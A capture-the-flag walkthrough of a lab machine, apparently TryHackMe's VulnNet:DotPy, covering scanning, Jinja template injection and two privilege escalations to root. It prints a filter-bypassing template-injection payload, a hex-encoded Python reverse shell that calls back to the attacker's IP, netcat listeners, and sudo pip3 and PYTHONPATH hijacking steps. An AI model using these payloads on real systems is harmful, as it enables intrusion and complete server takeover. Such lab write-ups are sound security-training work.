@@ -1,0 +1,137 @@
+VulnNet:DotPy
+
+
+NMAP RESULTS:
+
+Nmap scan report for 10.10.175.41
+Host is up, received conn-refused (0.16s latency).
+Scanned at 2021-04-09 03:46:29 EDT for 11s
+
+PORT     STATE SERVICE REASON  VERSION
+8080/tcp open  http    syn-ack Werkzeug httpd 1.0.1 (Python 3.6.9)
+| http-methods: 
+|_  Supported Methods: HEAD GET OPTIONS
+|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
+| http-title: VulnNet Entertainment -  Login  | Discover
+|_Requested resource was http://10.10.175.41:8080/login
+
+NSE: Script Post-scanning.
+
+AFTER ENUMERATING THE WEBSERVER:
+1. the ip on port 8080 redirects the page to a login page, i created an account having username 'test' and password 'test'
+2. after getting logged in, i found that after searching the webpage with gobuster:
+
+┌──(kali㉿kali)-[~]
+└─$ gobuster dir -u http://10.10.140.16:8080 -w /usr/share/wordlists/dirb/common.txt -t 20                                  
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.140.16:8080
+[+] Threads:        20
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2021/04/12 04:36:38 Starting gobuster
+===============================================================
+Error: the server returns a status code that matches the provided options for non existing urls. http://10.10.140.16:8080/da2e5cdf-11eb-4c04-8929-8aef2f528587 => 403. To force processing of Wildcard responses, specify the '--wildcard' switch
+
+FOR EVERY WRONG INPUT, IT GIVES 403 ERROR
+i thought that maybe this webpage is vulnerable to SSTI Vulnerability
+
+THEORY:
+---------------------------------------------
+A server-side template injection occurs when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.
+Template engines are designed to generate web pages by combining fixed templates with volatile data. Server-side template injection attacks can occur when user input is concatenated directly into a template, rather than passed in as data. This allows attackers to inject arbitrary template directives in order to manipulate the template engine, often enabling them to take complete control of the server.
+
+
+3. i tried some payloads to comfirm, i gave a request like this:
+   http://10.10.140.16:8080/index{{7*7}}
+
+After checking the response, it comfirmed the vulnerability as it also output the result of this input .ie 49
+After reading the article (hackertricks) and using the payload which is bypassing the most commom filters on PayloadsAllTheThings:
+
+SO USING BURP:
+
+Bypassing most common filters ('.','_','|join','[',']','mro' and 'base'):
+-----------------------------------------------------------------------------
+GET /index{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+
+
+RESPONSE:
+</h3>
+		No results for <b> indexuid=1001(web) gid=1001(web) groups=1001(web)
+</b>
+
+WE GOT CODE EXECUTION!!!
+LETS TRY TO GET A REVERSE SHELL
+
+
+MY PAYLOAD IS THE PYTHON REVERSE SHELL WHICH IS CONVERTED INTO HEX TO BYPASS THE FILTER:
+
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('\x70\x79\x74\x68\x6F\x6E\x20\x2D\x63\x20\x27\x69\x6D\x70\x6F\x72\x74\x20\x73\x6F\x63\x6B\x65\x74\x2C\x73\x75\x62\x70\x72\x6F\x63\x65\x73\x73\x2C\x6F\x73\x3B\x73\x3D\x73\x6F\x63\x6B\x65\x74\x2E\x73\x6F\x63\x6B\x65\x74\x28\x73\x6F\x63\x6B\x65\x74\x2E\x41\x46\x5F\x49\x4E\x45\x54\x2C\x73\x6F\x63\x6B\x65\x74\x2E\x53\x4F\x43\x4B\x5F\x53\x54\x52\x45\x41\x4D\x29\x3B\x73\x2E\x63\x6F\x6E\x6E\x65\x63\x74\x28\x28\x22\x31\x30\x2E\x38\x2E\x37\x33\x2E\x32\x31\x38\x22\x2C\x31\x32\x33\x34\x29\x29\x3B\x6F\x73\x2E\x64\x75\x70\x32\x28\x73\x2E\x66\x69\x6C\x65\x6E\x6F\x28\x29\x2C\x30\x29\x3B\x20\x6F\x73\x2E\x64\x75\x70\x32\x28\x73\x2E\x66\x69\x6C\x65\x6E\x6F\x28\x29\x2C\x31\x29\x3B\x20\x6F\x73\x2E\x64\x75\x70\x32\x28\x73\x2E\x66\x69\x6C\x65\x6E\x6F\x28\x29\x2C\x32\x29\x3B\x70\x3D\x73\x75\x62\x70\x72\x6F\x63\x65\x73\x73\x2E\x63\x61\x6C\x6C\x28\x5B\x22\x2F\x62\x69\x6E\x2F\x73\x68\x22\x2C\x22\x2D\x69\x22\x5D\x29\x3B\x27')|attr('read')()}}
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 1234 
+listening on [any] 1234 ...
+connect to [10.8.73.218] from (UNKNOWN) [10.10.140.16] 50214
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+
+GOT A REVERSE SHELL
+
+web@vulnnet-dotpy:/home$ sudo -l
+Matching Defaults entries for web on vulnnet-dotpy:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User web may run the following commands on vulnnet-dotpy:
+    (system-adm) NOPASSWD: /usr/bin/pip3 install *
+
+
+MAKING MY OWN SETUP.PY IN THE /dev/shm AND ADDING PYTHON REVERSE SHELL IN A FILE NAME setup.py:
+
+web@vulnnet-dotpy:~/shuriken-dotpy$ sudo -u system-adm /usr/bin/pip3 install /dev/shm
+Processing /dev/shm
+
+
+┌──(kali㉿kali)-[~/vulnnet3]
+└─$ nc -nvlp 4444                                                                                                    
+listening on [any] 4444 ...
+^Lconnect to [10.8.73.218] from (UNKNOWN) [10.10.140.16] 53064
+$ id
+uid=1000(system-adm) gid=1000(system-adm) groups=1000(system-adm),24(cdrom)
+$ 
+
+
+GOT THE USER FLAG
+
+system-adm@vulnnet-dotpy:~$ sudo -l
+Matching Defaults entries for system-adm on vulnnet-dotpy:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User system-adm may run the following commands on vulnnet-dotpy:
+    (ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py
+
+THIS 'SETENV' CAN BE EXPLOITED USING PYTHONPATH HIJACKING
+
+SO I CREATED A FILE NAME 'zipfile.py' AS THIS LIBRARY IS BEING IMPORTED BY THE 'backup.py' PROGRAM
+IN THE 'zipfile.py', I ADDED THE PYTHON REVERSE SHELL
+SET THE PATH TO THE /dev/shm DIRECTORY
+
+THEN:
+system-adm@vulnnet-dotpy:~$ sudo PYTHONPATH=/dev/shm python3 /opt/backup.py
+
+┌──(kali㉿kali)-[~/vulnnet3]
+└─$ nc -nvlp 1337                                                                            1 ⨯
+listening on [any] 1337 ...
+connect to [10.8.73.218] from (UNKNOWN) [10.10.140.16] 53788
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# 
+
+IM ROOT!!
+GOT THE ROOT FLAG
